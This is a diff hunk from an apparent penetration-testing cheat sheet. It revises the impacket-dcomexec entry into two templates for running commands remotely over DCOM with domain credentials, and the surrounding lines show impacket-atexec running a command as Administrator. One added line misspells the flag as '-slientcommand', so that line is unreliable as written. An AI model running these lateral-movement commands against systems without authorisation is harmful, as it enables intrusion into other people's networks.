@@ -4582,7 +4582,8 @@ impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE
 ##### impacket-dcomexec
 
 ```c
-impacket-dcomexec -object MMC20 -debug -silentcommand <DOMAIN>/<USERNAME>:'<PASSWORD>'<RHOST> '<COMMAND>'
+impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug '<DOMAIN>/<USERNAME>':'<PASSWORD>' '<COMMAND>'
+impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand '<DOMAIN>/<USERNAME>@<RHOST>' '<COMMAND>'
 ```
 
 ##### impacket-findDelegation
